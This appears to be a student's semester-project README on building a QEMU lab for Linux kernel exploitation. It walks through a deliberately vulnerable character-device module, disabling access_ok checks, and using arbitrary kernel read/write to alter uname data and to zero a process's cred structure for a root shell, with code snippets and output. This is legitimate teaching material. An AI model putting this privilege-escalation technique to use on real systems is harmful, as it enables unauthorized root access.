# Semester project 2021 - László Szapula

## Table of contents

* [Creating the enviornment and the first kernel module](#creating-the-enviornment-and-the-first-kernel-module)  
	 * [Installing qemu](#installing-qemu)  
	 * [Building linux kernel](#building-linux-kernel)  
	 * [Compiling buildroot](#compiling-buildroot)  
	 * [Boot script and testing](#boot-script-and-testing)  
	 * [GDB](#gdb)  
* [Device driver module and the first exploit](#device-driver-module-and-the-first-exploit)  
	 * [Device file](#device-file)  
	 * [The first exploit](#the-first-exploit)   
* [Privilege escalation with driver files](#privilege-escalation-with-driver-files)   
	 * [Cleaning up previous exploit ](#cleaning-up-previous-exploit)  
	 * [Getting root shell](#getting-root-shell)  

## Creating the enviornment and the first kernel module

### Installing qemu
sudo apt install qemu qemu-system-x86

```mkdir ~/kernel_debug  ```
// download linux source tar, extract it and rename linux-<version> to linux  
// download buildroot source archive, extract it and rename buildroot-<version> to buildroot
 

From here basically following the steps in the following website:  
https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/

### Building linux kernel
Configured everything just like on the website, but didnt apply KASan debugger and didn't disable any security features (will disable kaslr in qemu).

### Compiling buildroot
Same as above, selected ext2 fs, made init script and added root and 'user' users by creating shadow and passwd files (passwords are root and user).
Set user home permission in device table:  
```echo -e '/home/user\td\t755\t1000\t100\t-\t-\t-\t-\t-' >> <kernel_debug directory>/buildroot/system/device_table.txt```  
Added kernel modules:  
(in linux folder) ```make modules_install INSTALL_MOD_PATH=<kernel_debug directory>/buildroot/overlay```  
And finally make source & make

### Boot script and testing
Wrote boot.sh and started it. Then added ssh keys with ssh-copy-id, to be able to copy files (mainly kernel modules) with scp.
Then I wrote hello.c in linux/src/hello, compiled with Makefile and copied hello.ko to the qemu machine with scp.

### GDB
First added python script to gdbinit:  
```echo "add-auto-load-safe-path `pwd`/scripts/gdb/vmlinux-gdb.py" >> ~/.gdbinit```  

Then started it:  
```gdb vmlinux```  
```gdb> target remote :1234```  

Here I installed hello.ko (insmod) and copied the address of the module:  
```cat /proc/modules | grep hello```  

```gdb> add-symbols-file src/hello/hello.ko <address copied>```   

```gdb> b *<address copied>```  
  
Then I removed hello module (rmmod) and restarted it. Now I got a breakpoint in the init_module function.

## Device driver module and the first exploit

### Device file  
I updated the original hello.c to be able to read and write data to a device file and store its content in a static buffer.  
It can be found in the folder modules/hello2, and there is another folder, which contains a user space program, that writes to this device file and reads from it.  

First I need to load the kernel module:  
```insmod hello2.ko```  

Then I need the major version of the registered character device, which I can find in dmesg:  
```
dmesg | tail   
...
[ 8253.792398] hello2 module loaded with device major number 248
```  

With this number I'm able to create a character device file for this module:  
```mknod /dev/hello2 c 248 0``` 

Now I can test the userspace program, which I compiled on the host machine and scp-d to the qemu instance:  
```
./up-test
[+] Opening device file for writing...
String to send to module:
Hello, I'm LaTsa
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
[+] The message is: Hello, I'm LaTsa
```  

Now I can remove the device file and stop the kernel module:  
```
rm -f /dev/hello2 
rmmod hello2.ko 
[ 8752.559090] Goodbye then
```

### The first exploit  
Now that we can create a character device driver, and we can read from it and write to it, it's time to do some magic with it. In the original hello2 module we user `copy_from_user` and `copy_to_user` functions, that copies data from user space memory to kernel space memory and vice versa. What if the kernel module didn't use those functions? Let's try it by replacing them with `memcpy` (as seen in the hello2_vuln module).  
To exploit this weakness, lets write a simple c program (`hello2_vuln/exploit/exploit.c`). It's basically the same as the previous up_test program, but we make a simple change: we will not use a buffer in our code to receive what we read from the device file. We set the `receive` variable to hold the address of a special structure in the kernel.  
For example we want to change the structure, that is used by the `uname` program. This structure is in `/init/version.c` file and it's name is `init_uts_ns`. `uname` uses this structure to print us the information about the system. To get the address of this data, we can use `/proc/kallsyms`:  
```
cat /proc/kallsyms | grep init_uts_ns
...
ffffffff8301a620 D init_uts_ns
```  
We basically just need to load this address in the receive variable in exploit.c, and see the magic happen. After loading the module and generating it's device file, we can try the exploit:  
```
./exploit
[+] Opening device file for writing...
String to send to module:
HELLO
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
[-] Failed to read message from the device file
```
Ok, something went wrong. If we include the `errno.h` header and use the `perror(const char*)` function, we can get what the problem is:  
```
Error: Bad address
```

That's not good. If we try to debug the issue, and put a breakpoint in the `device_read` function, we wont stop in that function. It's because we don't even get there. Which means we fail already ad the `read` function in the exploit. Check out the source code of the write syscall.  
We can find this in `fs/read_write.c`, and the function looks like this:  
```
SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
{
	return ksys_read(fd, buf, count);
}
```
So it's basically just calling  the `ksys_read` function. Let's check it out. We can see, that amongst others this function is calling `vfs_read`:  
```
ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)
{
	struct fd f = fdget_pos(fd);
	ssize_t ret = -EBADF;

	if (f.file) {
		...
		ret = vfs_read(f.file, buf, count, ppos);
		...
	}
	return ret;
}
```
Vfs_read does again many things, but we see the interesting thing in the first few lines:  
```
ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
	ssize_t ret;

	if (!(file->f_mode & FMODE_READ))
		return -EBADF;
	if (!(file->f_mode & FMODE_CAN_READ))
		return -EINVAL;
	if (unlikely(!access_ok(buf, count)))
	 return -EFAULT;
 ...
 ...
 ...
 }
 ```
As we can see, it's returning -EFAULT (which makes errno write Bad address) based on the value of `access_ok`. This macro can be found in `include/asm-generic/uaccess.h`. It checks, if the function sends an address from its memory space. That's what stops us at our exploit. To get around it, we can comment out the if statement in vfs_read (and in vfs_write too), recompile the kernel, and retry the exploit.  
```
//if (unlikely(!access_ok(buf, count)))
// return -EFAULT;
```
Now if we try the exploit:  
```
 ./exploit
[+] Opening device file for writing...
String to send to module:
HELLO
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
```  
There is no error. Now if we try `uname -a`:
```
uname -a
HELLO latsa 5.11.0 #2 SMP Thu Feb 25 14:33:41 CET 2021 x86_64 GNU/Linux
```
It's working!

## Privilege escalation with driver files  

### Cleaning up previous exploit  
To be able to use our exploit for more than abusing uname, we need to clean the code a little bit. I basically wrote two functions: `read_kernel` and `write_kernel`.  
```
void read_kernel(void *address, const char* buffer, ssize_t size){
        check_fd();
        write_device(FD, address, size);
        read_device(FD, buffer, BUFFER_LEN);
}
```  
```
void write_kernel(void *address, const char* str_to_send, ssize_t size){
        check_fd();
        write_device(FD, str_to_send, size);
        read_device(FD, address, size);
}
```  
In`read_kernel` we make the driver write from the given address to its buffer, and we read it into our buffer. In `write_kernel` we write something into its buffer and then read it to the desired memory address. With this the previous exploit runs even better.  
```
# ./privesc 
[+] Opening device file...
[+] Reading from target...
[+] Kernel address successfully read
Linux
[+] Writing to target...
[+] Successfully written to target! Check with uname -a
# uname -a
HELLO latsa_kernel 5.11.0 #2 SMP Wed Mar 3 11:40:39 CET 2021 x86_64 GNU/Linux
```  

### Getting root shell  

```
# id
uid=1000(user) gid=1000 groups=1000
# ./privesc 
[+] PID = 183
[+] Reading head from init_tast...
[+] Kernel read
[+] Searching for the PID of this program...
        [+] PID of task: 2
        [+] PID of task: 3
        ...
        [+] PID of task: 183
[+] Address to our task: 0xffff888004471a80
[+] Address to cred: 0xffff8880044b7300
[+] Now setting our cred to 0...
[+] Root shell gained!
# id
uid=0(root) gid=1000 groups=1000
#
```

